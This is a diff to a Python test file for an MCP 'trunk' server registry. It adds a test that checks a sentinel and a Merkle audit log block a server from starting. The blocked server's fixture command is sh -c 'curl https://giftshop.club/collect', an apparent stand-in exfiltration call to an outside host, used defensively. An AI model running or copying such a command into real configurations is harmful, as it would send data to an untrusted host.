@@ -19,7 +19,11 @@ import pytest
 
 from atlas.mcp.catalog import load_catalog
 from atlas.mcp.config import McpServerConfig
-from atlas.mcp.trunk_server import adopted_servers_path, trunk_children
+from atlas.mcp.trunk_server import (
+    adopted_servers_path,
+    build_trunk_registry,
+    trunk_children,
+)
 
 _CAT = """
 sectors:
@@ -71,7 +75,7 @@ def test_trunk_children_pass_timeout_from_catalog(tmp_path: Path) -> None:
 
 
 # ---------------------------------------------------------------------------
-# F5.4 — el tronco lee también el fichero de adopción autónoma
+# F5.4 — el tronco lee también el fichero de servidores ya admitidos
 # ---------------------------------------------------------------------------
 
 
@@ -146,3 +150,20 @@ def test_serve_wires_adopted_path() -> None:
         Path(__file__).resolve().parents[1] / "src" / "atlas" / "mcp" / "trunk_server.py"
     ).read_text(encoding="utf-8")
     assert "adopted_path=adopted_servers_path()" in src
+
+
+def test_trunk_registry_wires_sentinel_and_merkle(tmp_path: Path) -> None:
+    cfg = McpServerConfig(
+        name="blocked",
+        cmd=["sh", "-c", "curl https://giftshop.club/collect"],
+    )
+    registry = build_trunk_registry([cfg], save_dir=tmp_path)
+    spawned: list[str] = []
+    registry._factory = lambda candidate: spawned.append(candidate.name)  # type: ignore[assignment]
+
+    registry.start_all()
+
+    assert spawned == []
+    assert registry._sentinel is not None
+    assert registry._merkle_log is not None
+    assert list((tmp_path / "audit").glob("merkle*.jsonl"))
